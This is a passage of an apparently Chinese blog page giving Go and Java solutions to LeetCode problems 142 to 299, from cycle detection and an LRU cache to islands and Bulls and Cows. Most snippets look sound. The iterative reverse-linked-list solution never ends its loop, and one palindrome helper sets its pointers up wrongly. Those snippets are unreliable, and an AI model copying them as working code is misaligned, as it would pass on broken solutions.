href="#快慢指针-1" class="headerlink" title="快慢指针"></a>快慢指针</h4><p>快慢指针解法，当二者第一次相遇时将其中一个指针返回到链开头，二者以同样的速度往下遍历，直到二者相等即返回。</p><pre><code class="go">func detectCycle(head *ListNode) *ListNode &#123;    slow, fast := head, head    for fast != nil &amp;&amp; fast.Next != nil &#123;        slow = slow.Next        fast = fast.Next.Next        if slow == fast &#123;            fast = head            for fast != slow &#123;                slow = slow.Next                fast = fast.Next            &#125;            return fast        &#125;    &#125;    return nil&#125;</code></pre><h3 id="143-Reorder-List"><a href="#143-Reorder-List" class="headerlink" title="143. Reorder List"></a><a href="https://leetcode-cn.com/problems/reorder-list/">143. Reorder List</a></h3><h4 id="双指针-3"><a href="#双指针-3" class="headerlink" title="双指针"></a>双指针</h4><p>先找到链表中点，将其切割成两个链表，再翻转后一链表，最后拼接即可。</p><ul><li>时间复杂度：$O(n)$</li><li>空间复杂度：$O(1)$</li></ul><pre><code class="go">/** * Definition for singly-linked list. * type ListNode struct &#123; *     Val int *     Next *ListNode * &#125; */func reorderList(head *ListNode)  &#123;    mid := searchMiddle(head)    rr := reverse(mid.Next)    mid.Next = nil    ll := head    var ltmp, rtmp *ListNode    left, right := ll, rr    for left != nil &amp;&amp; right != nil &#123;        ltmp = left.Next        rtmp = right.Next        left.Next = right        left = ltmp        right.Next = left        right = rtmp    &#125;&#125;// 查找链表中点func searchMiddle(head *ListNode) *ListNode &#123;    slow, fast := head, head    for fast != nil &amp;&amp; fast.Next != nil &amp;&amp; fast.Next.Next != nil &#123;        slow = slow.Next        fast = fast.Next.Next    &#125;    return slow&#125;// 翻转链表func reverse(head *ListNode) *ListNode &#123;    var pre, next *ListNode    for head != nil &#123;        next = head.Next        head.Next = pre        pre = head        head = next    &#125;    return pre&#125;</code></pre><h3 id="144-Binary-Tree-Preorder-Traversal"><a href="#144-Binary-Tree-Preorder-Traversal" class="headerlink" title="144. Binary Tree Preorder Traversal"></a><a href="https://leetcode-cn.com/problems/binary-tree-preorder-traversal/">144. Binary Tree Preorder Traversal</a></h3><h4 id="辅助栈"><a href="#辅助栈" class="headerlink" title="辅助栈"></a>辅助栈</h4><pre><code class="go">/** * Definition for a binary tree node. * type TreeNode struct &#123; *     Val int *     Left *TreeNode *     Right *TreeNode * &#125; */func preorderTraversal(root *TreeNode) []int &#123;    res := make([]int, 0)    stack := make([]*TreeNode, 0)    for root != nil || len(stack) &gt; 0 &#123;        for root != nil &#123;            stack = append(stack, root)            res = append(res, root.Val)            root = root.Left        &#125;        if len(stack) &gt; 0 &#123;            root = stack[len(stack)-1]            stack = stack[:len(stack)-1]            root = root.Right        &#125;    &#125;    return res&#125;</code></pre><h3 id="146-LRU-Cache"><a href="#146-LRU-Cache" class="headerlink" title="146. LRU Cache"></a><a href="https://leetcode-cn.com/problems/lru-cache/">146. LRU Cache</a></h3><p>LRU 算法模板。</p><pre><code class="go">type entry struct &#123;    key int    val int&#125;type LRUCache struct &#123;    cap int    ll  *list.List    cache map[int]*list.Element&#125;func Constructor(capacity int) LRUCache &#123;    return LRUCache &#123;capacity, list.New(), make(map[int]*list.Element)&#125;&#125;func (this *LRUCache) Get(key int) int &#123;    ele := this.cache[key]    if ele == nil &#123;        return -1    &#125;    this.ll.MoveToFront(ele)    return ele.Value.(entry).val&#125;func (this *LRUCache) Put(key int, value int)  &#123;    if ele := this.cache[key]; ele != nil &#123;        // 已存在，更新并移动至链首        ele.Value = entry&#123;key, value&#125;        this.ll.MoveToFront(ele)        return    &#125;    if len(this.cache) == this.cap &#123;        // 容量已满，删除链尾        delete(this.cache, this.ll.Remove(this.ll.Back()).(entry).key)    &#125;    this.cache[key] = this.ll.PushFront(entry&#123;key, value&#125;)&#125;/** * Your LRUCache object will be instantiated and called as such: * obj := Constructor(capacity); * param_1 := obj.Get(key); * obj.Put(key,value); */</code></pre><h3 id="151-Reverse-Words-in-a-String"><a href="#151-Reverse-Words-in-a-String" class="headerlink" title="151. Reverse Words in a String"></a><a href="https://leetcode-cn.com/problems/reverse-words-in-a-string/">151. Reverse Words in a String</a></h3><h4 id="反转"><a href="#反转" class="headerlink" title="反转"></a>反转</h4><ol><li>去除多余空格（快慢指针）</li><li>反转整个字符串</li><li>反转单词</li></ol><ul><li>时间复杂度：$O(n)$</li><li>空间复杂度：$O(n)$</li><li>空间复杂度（优化）：$O(1)$</li></ul><blockquote><p>可以不把步骤单独封装为函数以减小内存消耗，如忽略 Go 字符串不可变的问题，空间复杂度可以达到 $O(1)$。</p></blockquote><pre><code class="go">func reverseWords(s string) string &#123;    str := []byte(s)    str = trim(str)    reverse(str)        for i, j := 0, 0; j &lt;= len(str); &#123;        if j &lt; len(str) &amp;&amp; str[j] != &#39; &#39; &#123;            j++            continue        &#125; else &#123;            reverse(str[i:j])            j++            i = j        &#125;    &#125;    return string(str)&#125;// trim 函数删除多余空格func trim(s []byte) []byte &#123;    slow, fast := 0, 0    for fast &lt; len(s) &amp;&amp; s[fast] == &#39; &#39; &#123;        fast++    &#125;    for ; fast &lt; len(s); fast++ &#123;        if fast &gt; 1 &amp;&amp; s[fast] == &#39; &#39; &amp;&amp; s[fast-1] == s[fast] &#123;            continue        &#125;        s[slow] = s[fast]        slow++    &#125;    if s[slow-1] == &#39; &#39; &#123;        return s[:slow-1]    &#125;    return s[:slow]&#125;// reverse 函数反转整个 sfunc reverse(s []byte) &#123;    for i, j := 0, len(s)-1; i &lt; j; i, j = i+1, j-1 &#123;        s[i], s[j] = s[j], s[i]    &#125;&#125;</code></pre><h3 id="153-Find-Minimum-in-Rotated-Sorted-Array"><a href="#153-Find-Minimum-in-Rotated-Sorted-Array" class="headerlink" title="153. Find Minimum in Rotated Sorted Array"></a><a href="https://leetcode-cn.com/problems/find-minimum-in-rotated-sorted-array/">153. Find Minimum in Rotated Sorted Array</a></h3><h4 id="二分查找-2"><a href="#二分查找-2" class="headerlink" title="二分查找"></a>二分查找</h4><ul><li>时间复杂度：$O(logn)$</li><li>空间复杂度：$O(1)$</li></ul><h5 id="Java-3"><a href="#Java-3" class="headerlink" title="Java"></a>Java</h5><pre><code class="java">class Solution &#123;    public int findMin(int[] nums) &#123;        int low = 0, high = nums.length-1, mid = 0;        while (low &lt; high) &#123;            mid = (low + high) &gt;&gt; 1;            if (nums[mid] &gt; nums[high]) &#123;                low = mid + 1;            &#125; else &#123;                high = mid;            &#125;        &#125;        return nums[low];    &#125;&#125;</code></pre><h3 id="154-Find-Minimum-in-Rotated-Sorted-Array-II"><a href="#154-Find-Minimum-in-Rotated-Sorted-Array-II" class="headerlink" title="154. Find Minimum in Rotated Sorted Array II"></a><a href="https://leetcode-cn.com/problems/find-minimum-in-rotated-sorted-array-ii/">154. Find Minimum in Rotated Sorted Array II</a></h3><h4 id="二分查找-3"><a href="#二分查找-3" class="headerlink" title="二分查找"></a>二分查找</h4><pre><code class="go">func findMin(nums []int) int &#123;    low, high := 0, len(nums)-1    for low &lt; high &#123;        mid := (low + high) &gt;&gt; 1        if nums[mid] &lt; nums[high] &#123;            // right ordered            high = mid        &#125; else if nums[mid] &gt; nums[high] &#123;            // left ordered            low = mid + 1        &#125; else &#123;            high--        &#125;    &#125;    return nums[low]&#125;</code></pre><h3 id="155-Min-Stack"><a href="#155-Min-Stack" class="headerlink" title="155. Min Stack"></a><a href="https://leetcode-cn.com/problems/min-stack/">155. Min Stack</a></h3><p>设置辅助栈，当有比辅助栈栈顶更小或与其相等的值输入则入栈。弹出时当栈顶相等时弹出辅助栈栈顶。</p><pre><code class="go">type MinStack struct &#123;    Stack []int    Helper []int&#125;func Constructor() MinStack &#123;    return MinStack&#123;[]int&#123;&#125;, []int&#123;&#125;&#125;&#125;func (this *MinStack) Push(val int)  &#123;    if len(this.Helper) == 0 || val &lt;= this.Helper[len(this.Helper)-1] &#123;        this.Helper = append(this.Helper, val)    &#125;    this.Stack = append(this.Stack, val)&#125;func (this *MinStack) Pop()  &#123;    if this.Stack[len(this.Stack)-1] == this.Helper[len(this.Helper)-1] &#123;        this.Helper = this.Helper[:len(this.Helper)-1]    &#125;    this.Stack = this.Stack[:len(this.Stack)-1]&#125;func (this *MinStack) Top() int &#123;    return this.Stack[len(this.Stack)-1]&#125;func (this *MinStack) GetMin() int &#123;    return this.Helper[len(this.Helper)-1]&#125;/** * Your MinStack object will be instantiated and called as such: * obj := Constructor(); * obj.Push(val); * obj.Pop(); * param_3 := obj.Top(); * param_4 := obj.GetMin(); */</code></pre><h3 id="157-Read-N-Characters-Given-Read4"><a href="#157-Read-N-Characters-Given-Read4" class="headerlink" title="157. Read N Characters Given Read4"></a><a href="https://leetcode-cn.com/problems/read-n-characters-given-read4/">157. Read N Characters Given Read4</a></h3><p>题目意思是用函数 <code>read4()</code> 来实现函数 <code>read()</code>，前者每次只能读取 4 个字符。使用循环解答即可，当 <code>read4()</code> 返回的值小于 4，表示已经不再需要 <code>read4()</code> 了，可以停止循环。</p><pre><code class="go">/** * The read4 API is already defined for you. * *     read4 := func(buf4 []byte) int * * // Below is an example of how the read4 API can be called. * file := File(&quot;abcdefghijk&quot;) // File is &quot;abcdefghijk&quot;, initially file pointer (fp) points to &#39;a&#39; * buf4 := make([]byte, 4) // Create buffer with enough space to store characters * read4(buf4) // read4 returns 4. Now buf = [&#39;a&#39;,&#39;b&#39;,&#39;c&#39;,&#39;d&#39;], fp points to &#39;e&#39; * read4(buf4) // read4 returns 4. Now buf = [&#39;e&#39;,&#39;f&#39;,&#39;g&#39;,&#39;h&#39;], fp points to &#39;i&#39; * read4(buf4) // read4 returns 3. Now buf = [&#39;i&#39;,&#39;j&#39;,&#39;k&#39;,...], fp points to end of file */var solution = func(read4 func([]byte) int) func([]byte, int) int &#123;    // implement read below.    return func(buf []byte, n int) int &#123;        cnt := 0    // 统计数量        num := 4    // read4() 读取的数量        for num == 4 &#123;            num = read4(buf[cnt:])    // 偏移 cnt            cnt += num        &#125;        // 返回 n 和 cnt 二者较小值        if n &lt; cnt &#123;            return n        &#125;        return cnt    &#125;&#125;</code></pre><h3 id="160-Intersection-of-Two-Linked-Lists"><a href="#160-Intersection-of-Two-Linked-Lists" class="headerlink" title="160. Intersection of Two Linked Lists"></a><a href="https://leetcode.com/problems/intersection-of-two-linked-lists/description/">160. Intersection of Two Linked Lists</a></h3><h4 id="Hash-Table-2"><a href="#Hash-Table-2" class="headerlink" title="Hash Table"></a>Hash Table</h4><p>使用 Map 保存一个链表的所有节点，遍历第二个链表，如果在 Map 中已存在则返回。</p><pre><code class="go">/** * Definition for singly-linked list. * type ListNode struct &#123; *     Val int *     Next *ListNode * &#125; */func getIntersectionNode(headA, headB *ListNode) *ListNode &#123;    m := make(map[*ListNode]bool)    for headA != nil &#123;        m[headA] = true        headA = headA.Next    &#125;    for headB != nil &#123;        if _, ok := m[headB]; ok &#123;            return headB        &#125;        headB = headB.Next    &#125;    return nil&#125;</code></pre><h4 id="交叉"><a href="#交叉" class="headerlink" title="交叉"></a>交叉</h4><pre><code class="go">func getIntersectionNode(headA, headB *ListNode) *ListNode &#123;    // 边界判断    if headA == nil || headB == nil &#123;        return nil    &#125;    pA, pB := headA, headB    for pA != pB &#123;        if pA != nil &#123;                pA = pA.Next        &#125; else &#123;            pA = headB        &#125;        if pB != nil &#123;            pB = pB.Next        &#125; else &#123;            pB = headA        &#125;    &#125;    return pA&#125;</code></pre><h3 id="162-Find-Peak-Element"><a href="#162-Find-Peak-Element" class="headerlink" title="162. Find Peak Element"></a><a href="https://leetcode-cn.com/problems/find-peak-element/">162. Find Peak Element</a></h3><h4 id="二分查找-4"><a href="#二分查找-4" class="headerlink" title="二分查找"></a>二分查找</h4><p>爬坡法。</p><ul><li>时间复杂度：$O(logn)$</li><li>空间复杂度：$O(1)$</li></ul><h5 id="Java-4"><a href="#Java-4" class="headerlink" title="Java"></a>Java</h5><pre><code class="java">class Solution &#123;    public int findPeakElement(int[] nums) &#123;        int low = 0, high = nums.length-1, mid = 0;        while (low &lt; high) &#123;            mid = (low + high) &gt;&gt; 1;            if (nums[mid] &lt; nums[mid+1]) &#123;                low = mid + 1;            &#125; else &#123;                high = mid;            &#125;        &#125;        return low;    &#125;&#125;</code></pre><h3 id="163-Missing-Ranges"><a href="#163-Missing-Ranges" class="headerlink" title="163. Missing Ranges"></a><a href="https://leetcode-cn.com/problems/missing-ranges/">163. Missing Ranges</a></h3><p>简单遍历。</p><pre><code class="go">func findMissingRanges(nums []int, lower int, upper int) []string &#123;    res := make([]string, 0)    if len(nums) == 0 &#123;        res = append(res, genStr(lower, upper))        return res    &#125;    if nums[0] != lower &#123;        // lower 不在数组内        res = append(res, genStr(lower, nums[0]-1))    &#125;    for i := 0; i &lt; len(nums)-1; i++ &#123;        // 对比相邻数字        if nums[i+1] - nums[i] &gt; 1 &#123;            res = append(res, genStr(nums[i]+1, nums[i+1]-1))        &#125;    &#125;    if upper != nums[len(nums)-1] &#123;        // upper 不在数组内        res = append(res, genStr(nums[len(nums)-1]+1, upper))    &#125;    return res&#125;// 生成字符串func genStr(x, y int) string &#123;    if x == y &#123;        return fmt.Sprintf(&quot;%d&quot;, x)    &#125;    return fmt.Sprintf(&quot;%d-&gt;%d&quot;, x, y)&#125;</code></pre><h3 id="169-Majority-Element"><a href="#169-Majority-Element" class="headerlink" title="169. Majority Element"></a><a href="https://leetcode-cn.com/problems/majority-element/">169. Majority Element</a></h3><h4 id="摩尔投票法"><a href="#摩尔投票法" class="headerlink" title="摩尔投票法"></a>摩尔投票法</h4><p>假设一个数为众数，当有数字与其相同时众数统计数量加一，不同时统计数量减一，统计数量为 0 则重新设置众数，这样到最后除目标数字以外都会被抵消掉。</p><pre><code class="go">func majorityElement(nums []int) int &#123;    // num 为众数，sum 为和    num, sum := 0, 0    for i := range nums &#123;        if sum == 0 &#123;            num = nums[i]        &#125;        if nums[i] != num &#123;            sum--        &#125; else &#123;            sum++        &#125;    &#125;    return num&#125;</code></pre><h3 id="191-Number-of-1-Bits"><a href="#191-Number-of-1-Bits" class="headerlink" title="191. Number of 1 Bits"></a><a href="https://leetcode-cn.com/problems/number-of-1-bits/">191. Number of 1 Bits</a></h3><pre><code class="go">func hammingWeight(num uint32) int &#123;    count := 0    for num != 0 &#123;        if num&amp;1 == 1 &#123;            count++        &#125;        num = num &gt;&gt; 1    &#125;    return count&#125;</code></pre><h3 id="199-Binary-Tree-Right-Side-View"><a href="#199-Binary-Tree-Right-Side-View" class="headerlink" title="199. Binary Tree Right Side View"></a><a href="https://leetcode-cn.com/problems/binary-tree-right-side-view/">199. Binary Tree Right Side View</a></h3><h3 id="队列-1"><a href="#队列-1" class="headerlink" title="队列"></a>队列</h3><p>与 102 题相同，简单修改即可，求每一层的最后一个元素。</p><pre><code class="go">/** * Definition for a binary tree node. * type TreeNode struct &#123; *     Val int *     Left *TreeNode *     Right *TreeNode * &#125; */func rightSideView(root *TreeNode) []int &#123;    if root == nil &#123;        return nil    &#125;    ret := make([]int, 0)    queue := []*TreeNode&#123;root&#125;    for len(queue) &gt; 0 &#123;        tmp := root.Val        for i := len(queue); i &gt; 0; i-- &#123;            node := queue[0]            if node.Left != nil &#123;                queue = append(queue, node.Left)            &#125;            if node.Right != nil &#123;                queue = append(queue, node.Right)            &#125;            tmp = node.Val            queue = queue[1:]        &#125;        ret = append(ret, tmp)    &#125;    return ret&#125;</code></pre><h3 id="200-Number-of-Islands"><a href="#200-Number-of-Islands" class="headerlink" title="200. Number of Islands"></a><a href="https://leetcode-cn.com/problems/number-of-islands/">200. Number of Islands</a></h3><h4 id="DFS-2"><a href="#DFS-2" class="headerlink" title="DFS"></a>DFS</h4><p>创建 <code>visited</code> 数组标记是否遍历到，再逐个进行 DFS 即可。</p><pre><code class="go">func numIslands(grid [][]byte) int &#123;    visited := make([][]bool, len(grid))    for i := range visited &#123;        visited[i] = make([]bool, len(grid[0]))    &#125;    count := 0    for i := range grid &#123;        for j := range grid[0] &#123;            if grid[i][j] == &#39;1&#39; &amp;&amp; !visited[i][j] &#123;                dfs(grid, visited, i, j)                count++            &#125;        &#125;    &#125;    return count&#125;func dfs(grid [][]byte, visited [][]bool, row, col int) &#123;    if row &lt; 0 || col &lt; 0 || row &gt;= len(grid) || col &gt;= len(grid[0]) || visited[row][col] || grid[row][col] == &#39;0&#39; &#123;        return    &#125;    visited[row][col] = true    dfs(grid, visited, row + 1, col)    dfs(grid, visited, row - 1, col)    dfs(grid, visited, row, col + 1)    dfs(grid, visited, row, col - 1)&#125;</code></pre><p>优化上述代码，在原矩阵上标记即可。</p><pre><code class="go">func numIslands(grid [][]byte) int &#123;    count := 0    for i := range grid &#123;        for j := range grid[0] &#123;            if grid[i][j] == &#39;1&#39; &#123;                dfs(grid, i, j)                count++            &#125;        &#125;    &#125;    return count&#125;func dfs(grid [][]byte, row, col int) &#123;    if row &lt; 0 || col &lt; 0 || row &gt;= len(grid) || col &gt;= len(grid[0]) || grid[row][col] != &#39;1&#39; &#123;        return    &#125;    grid[row][col] = &#39;0&#39;    // 标记为非 1 字符都可    dfs(grid, row + 1, col)    dfs(grid, row - 1, col)    dfs(grid, row, col + 1)    dfs(grid, row, col - 1)&#125;</code></pre><h2 id="201-300"><a href="#201-300" class="headerlink" title="201-300"></a>201-300</h2><h3 id="206-Reverse-Linked-List"><a href="#206-Reverse-Linked-List" class="headerlink" title="206. Reverse Linked List"></a>206. <a href="https://leetcode.com/problems/reverse-linked-list/description/">Reverse Linked List</a></h3><h4 id="Ideas-16"><a href="#Ideas-16" class="headerlink" title="Ideas"></a>Ideas</h4><ul><li>遍历链表并重新创建一个链表，比较简单粗暴。</li><li>记录前一个结点，并将当前节点指向前一结点。</li><li>递归</li></ul><h4 id="Solutions-16"><a href="#Solutions-16" class="headerlink" title="Solutions"></a>Solutions</h4><ul><li><p>反转</p><pre><code class="go">func reverseList(head *ListNode) *ListNode &#123;    var prev, next *ListNode    for &#123;        next = head.Next     // 存储下一结点        head.Next = prev       // 改变指针        prev = head            // 存储当前结点        head = next            // 跳转到下一个结点    &#125;    return prev&#125;</code></pre></li><li><p>递归</p><pre><code class="go">func reverseList(head *ListNode) *ListNode &#123;    if head == nil || head.Next == nil &#123;        return head    &#125;    dummy := reverseList(head.Next)    head.Next.Next = head    // 让下一结点指向自己    head.Next = nil            // 删除指向下一结点的指针    return dummy&#125;</code></pre></li></ul><h3 id="215-Kth-Largest-Element-in-an-Array"><a href="#215-Kth-Largest-Element-in-an-Array" class="headerlink" title="215. Kth Largest Element in an Array"></a><a href="https://leetcode-cn.com/problems/kth-largest-element-in-an-array/">215. Kth Largest Element in an Array</a></h3><h4 id="排序-1"><a href="#排序-1" class="headerlink" title="排序"></a>排序</h4><p>堆排序：</p><pre><code class="go">func HeapSort(arr []int) &#123;    for i := len(arr) - 1; i &gt;= 0; i-- &#123;        heapify(arr, i)        arr[0], arr[i] = arr[i], arr[0]    &#125;    return&#125;func heapify(arr []int, end int) &#123;    for i := (len(arr) - 2) / 2; i &gt;= 0; i-- &#123;        sift_down(arr, i, end)    &#125;&#125;func sift_down(arr []int, start, end int) &#123;    root := start    for &#123;        child := root*2 + 1        if child &gt; end &#123;            break        &#125;        if child+1 &lt;= end &amp;&amp; arr[child] &lt; arr[child+1] &#123;            child++        &#125;        if arr[root] &gt;= arr[child] &#123;            return        &#125;        arr[root], arr[child] = arr[child], arr[root]        root = child    &#125;&#125;</code></pre><h3 id="226-Invert-Binary-Tree"><a href="#226-Invert-Binary-Tree" class="headerlink" title="226. Invert Binary Tree"></a><a href="https://leetcode-cn.com/problems/invert-binary-tree/">226. Invert Binary Tree</a></h3><h4 id="递归-7"><a href="#递归-7" class="headerlink" title="递归"></a>递归</h4><pre><code class="go">/** * Definition for a binary tree node. * type TreeNode struct &#123; *     Val int *     Left *TreeNode *     Right *TreeNode * &#125; */func invertTree(root *TreeNode) *TreeNode &#123;    if root == nil &#123;        return nil    &#125;    root.Left, root.Right = root.Right, root.Left    invertTree(root.Left)    invertTree(root.Right)    return root&#125;</code></pre><h3 id="230-Kth-Smallest-Element-in-a-BST"><a href="#230-Kth-Smallest-Element-in-a-BST" class="headerlink" title="230. Kth Smallest Element in a BST"></a><a href="https://leetcode-cn.com/problems/kth-smallest-element-in-a-bst/">230. Kth Smallest Element in a BST</a></h3><h4 id="中序遍历（递归）-1"><a href="#中序遍历（递归）-1" class="headerlink" title="中序遍历（递归）"></a>中序遍历（递归）</h4><p>利用中序遍历 BST 的结果有序的特性递归求解。</p><ul><li>时间复杂度：$O(n)$</li><li>空间复杂度：$O(n)$</li></ul><pre><code class="go">/** * Definition for a binary tree node. * type TreeNode struct &#123; *     Val int *     Left *TreeNode *     Right *TreeNode * &#125; */var count intvar node *TreeNodefunc kthSmallest(root *TreeNode, k int) int &#123;    count = 0    node = new(TreeNode)    inorder(root, k)    return node.Val&#125;func inorder(root *TreeNode, k int) &#123;    if root == nil &#123;        return    &#125;    inorder(root.Left, k)    count++    if count == k &#123;        node = root        return    &#125;    inorder(root.Right, k)&#125;</code></pre><h3 id="234-Palindrome-Linked-List"><a href="#234-Palindrome-Linked-List" class="headerlink" title="234. Palindrome Linked List"></a><a href="https://leetcode-cn.com/problems/palindrome-linked-list/">234. Palindrome Linked List</a></h3><h4 id="辅助栈-1"><a href="#辅助栈-1" class="headerlink" title="辅助栈"></a>辅助栈</h4><ul><li>时间复杂度：$O(n)$</li><li>空间复杂度：$O(n)$</li></ul><pre><code class="go">/** * Definition for singly-linked list. * type ListNode struct &#123; *     Val int *     Next *ListNode * &#125; */func isPalindrome(head *ListNode) bool &#123;    stack := make([]int, 0)    for p := head; p != nil; p = p.Next &#123;        stack = append(stack, p.Val)    &#125;    for i := len(stack)-1; i &gt;= 0; i-- &#123;        if stack[i] != head.Val &#123;            return false        &#125;        head = head.Next    &#125;    return true&#125;</code></pre><h4 id="翻转链表"><a href="#翻转链表" class="headerlink" title="翻转链表"></a>翻转链表</h4><p>先找到链表中点，再翻转链表后半部分。</p><blockquote><p>注意，这种方法会改变原链表结构，如有必要，需要将链表恢复原状。</p></blockquote><ul><li>时间复杂度：$O(n)$</li><li>空间复杂度：$O(1)$</li></ul><pre><code class="go">/** * Definition for singly-linked list. * type ListNode struct &#123; *     Val int *     Next *ListNode * &#125; */func isPalindrome(head *ListNode) bool &#123;    // 快慢指针找到链表中点    slow, fast := head, head    count := 0    for fast != nil &amp;&amp; fast.Next != nil &#123;        slow = slow.Next        fast = fast.Next.Next        count++    &#125;    right := reverse(slow)    // 分别遍历    for count &gt; 0 &#123;        if head.Val != right.Val &#123;            return false        &#125;        head = head.Next        right = right.Next        count--    &#125;    return true&#125;// 翻转链表func reverse(head *ListNode) *ListNode &#123;    pre, next := head, head    for head != nil &#123;        next = head.Next        head.Next = pre        pre = head        head = next    &#125;    return pre&#125;</code></pre><h3 id="235-Lowest-Common-Ancestor-of-a-Binary-Search-Tree"><a href="#235-Lowest-Common-Ancestor-of-a-Binary-Search-Tree" class="headerlink" title="235. Lowest Common Ancestor of a Binary Search Tree"></a><a href="https://leetcode-cn.com/problems/lowest-common-ancestor-of-a-binary-search-tree/">235. Lowest Common Ancestor of a Binary Search Tree</a></h3><pre><code class="go">/** * Definition for a binary tree node. * type TreeNode struct &#123; *     Val   int *     Left  *TreeNode *     Right *TreeNode * &#125; */func lowestCommonAncestor(root, p, q *TreeNode) *TreeNode &#123;    for root != nil &#123;        if root.Val &lt; p.Val &amp;&amp; root.Val &lt; q.Val &#123;            root = root.Right        &#125; else if  root.Val &gt; p.Val &amp;&amp; root.Val &gt; q.Val &#123;            root = root.Left        &#125; else &#123;            break        &#125;    &#125;    return root&#125;</code></pre><h3 id="236-Lowest-Common-Ancestor-of-a-Binary-Tree"><a href="#236-Lowest-Common-Ancestor-of-a-Binary-Tree" class="headerlink" title="236. Lowest Common Ancestor of a Binary Tree"></a><a href="https://leetcode-cn.com/problems/lowest-common-ancestor-of-a-binary-tree/">236. Lowest Common Ancestor of a Binary Tree</a></h3><h4 id="递归-8"><a href="#递归-8" class="headerlink" title="递归"></a>递归</h4><pre><code class="go">func lowestCommonAncestor(root, p, q *TreeNode) *TreeNode &#123;    if root == nil || p == root || q == root &#123;        return root    &#125;    left := lowestCommonAncestor(root.Left, p, q)    right := lowestCommonAncestor(root.Right, p, q)    if left != nil &amp;&amp; right != nil &#123;        return root    &#125;    if left == nil &#123;        return right    &#125;    return left&#125;</code></pre><h3 id="237-Delete-Node-in-a-Linked-List"><a href="#237-Delete-Node-in-a-Linked-List" class="headerlink" title="237. Delete Node in a Linked List"></a><a href="https://leetcode-cn.com/problems/delete-node-in-a-linked-list/">237. Delete Node in a Linked List</a></h3><pre><code class="go">/** * Definition for singly-linked list. * type ListNode struct &#123; *     Val int *     Next *ListNode * &#125; */func deleteNode(node *ListNode) &#123;    *node = *(node.Next)&#125;</code></pre><h3 id="242-Valid-Anagram"><a href="#242-Valid-Anagram" class="headerlink" title="242. Valid Anagram"></a><a href="https://leetcode.com/problems/valid-anagram/description/">242. Valid Anagram</a></h3><h4 id="Ideas-17"><a href="#Ideas-17" class="headerlink" title="Ideas"></a>Ideas</h4><ol><li>使用 HashTable 存储<code>s</code>中所有字符的出现次数，和 t 进行对比，相同则返回<code>true</code>。</li><li>和 HashTable 同样的思路，但由于存储的是小写字母，因此可以直接用一个长度为 26 的数组存储每一个字符的 ASCII 码值。</li></ol><h4 id="Solutions-17"><a href="#Solutions-17" class="headerlink" title="Solutions"></a>Solutions</h4><ol><li><p>HashTable</p><pre><code class="go">func isAnagram(s string, t string) bool &#123;    m := make(map[rune]int)    for _, v := range s &#123;        m[v]++    &#125;    for _, v := range t &#123;        m[v]--    &#125;    for _, v := range m &#123;        if v != 0 &#123;            return false        &#125;    &#125;    return true&#125;</code></pre></li><li><p>数组</p><pre><code class="go">func isAnagram(s string, t string) bool &#123;    arr := [26]int&#123;0&#125;    for _, v := range s &#123;        arr[v%97]++    &#125;    for _, v := range t &#123;        arr[v%97]--    &#125;    for _, v := range arr &#123;        if v != 0 &#123;            return false        &#125;    &#125;    return true&#125;</code></pre></li></ol><h3 id="264-Ugly-Number-II"><a href="#264-Ugly-Number-II" class="headerlink" title="264. Ugly Number II"></a><a href="https://leetcode-cn.com/problems/ugly-number-ii/">264. Ugly Number II</a></h3><h4 id="动态规划-2"><a href="#动态规划-2" class="headerlink" title="动态规划"></a>动态规划</h4><pre><code class="go">func nthUglyNumber(n int) int &#123;    dp := make([]int, n)    dp[0] = 1    p1, p2, p3 := 0, 0, 0    for i := 1; i &lt; n; i++ &#123;        dp[i] = min(dp[p1] * 2, dp[p2] * 3, dp[p3] * 5)        if dp[i] == dp[p1] * 2 &#123;            p1++        &#125;        if dp[i] == dp[p2] * 3 &#123;            p2++        &#125;        if dp[i] == dp[p3] * 5 &#123;            p3++        &#125;    &#125;    return dp[len(dp)-1]&#125;func min(a, b, c int) int &#123;    switch &#123;    case a &lt;= b &amp;&amp; a &lt;= c:        return a    case a &lt;= b:        return c    case b &lt;= c:        return b    default:        return c    &#125;&#125;</code></pre><h3 id="283-Move-Zeroes"><a href="#283-Move-Zeroes" class="headerlink" title="283. Move Zeroes"></a><a href="https://leetcode-cn.com/problems/move-zeroes/">283. Move Zeroes</a></h3><h4 id="双指针-4"><a href="#双指针-4" class="headerlink" title="双指针"></a>双指针</h4><ul><li>时间复杂度：$O(n)$</li><li>空间复杂度：$O(1)$</li></ul><pre><code class="go">func moveZeroes(nums []int)  &#123;    left, right, length := 0, 0, len(nums)    for right &lt; length &#123;        if nums[right] != 0 &#123;            if nums[left] == 0 &#123;                nums[left], nums[right] = nums[right], nums[left]            &#125;            left++        &#125;        right++    &#125;&#125;</code></pre><h3 id="287-Find-the-Duplicate-Number"><a href="#287-Find-the-Duplicate-Number" class="headerlink" title="287. Find the Duplicate Number"></a><a href="https://leetcode-cn.com/problems/find-the-duplicate-number/">287. Find the Duplicate Number</a></h3><h4 id="双指针-5"><a href="#双指针-5" class="headerlink" title="双指针"></a>双指针</h4><p>本题与链表找环入口同理，用下标当作链表的下一节点，会形成一个存在环的链表。</p><ul><li>时间复杂度：$O(n)$</li><li>空间复杂度：$O(1)$</li></ul><pre><code class="go">func findDuplicate(nums []int) int &#123;    slow, fast := 0, 0    for &#123;        slow = nums[slow]        fast = nums[nums[fast]]        if slow == fast &#123;            fast = 0            break        &#125;    &#125;    for nums[slow] != nums[fast] &#123;        fast = nums[fast]        slow = nums[slow]    &#125;    return nums[slow]&#125;</code></pre><h3 id="299-Bulls-and-Cows"><a href="#299-Bulls-and-Cows" class="headerlink" title="299. Bulls and Cows"></a><a href="https://leetcode-cn.com/problems/bulls-and-cows/">299. Bulls and Cows</a></h3><h4 id="哈希表-1"><a href="#哈希表-1" class="headerlink" title="哈希表"></a>哈希表</h4><p>本题本质上就是求出两对数字中的相同位置数个数以及公有的数字个数。用哈希表存储就可以，但因为数字只在 0 ~ 9 范围内，可以使用数组存储。</p><ul><li>时间复杂度：$O(n)$</li><li>空间复杂度：$O(1)$</li></ul><pre><code class="go">func getHint(secret string, guess string) string &#123;    nums := make([]int, 10)    // replace hash table    a, b := 0, 0    // count A and B    for i := 0; i &lt; len(secret); i++ &#123;        if secret[i] == guess[i] &#123;            a++        &#125; else &#123;            if nums[secret[i]-&#39;0&#39;] &lt; 0 &#123;                b++            &#125;            nums[secret[i]-&#39;0&#39;]++            if nums[guess[i]-&#39;0&#39;] &gt; 0 &#123;                b++            &#125;            nums[guess[i]-&#39;0&#39;]--        &#125;    &#125;    return fmt.Sprintf(&quot;%dA%dB&quot;, a, b)&#125;</code></pre><h2 id="301-400"><a href="#301-400" class="headerlink" title="301-400"></a>301-400</h2><h3 id="338-Counting-Bits"><a href="#338-Counting-Bits" class="headerlink" 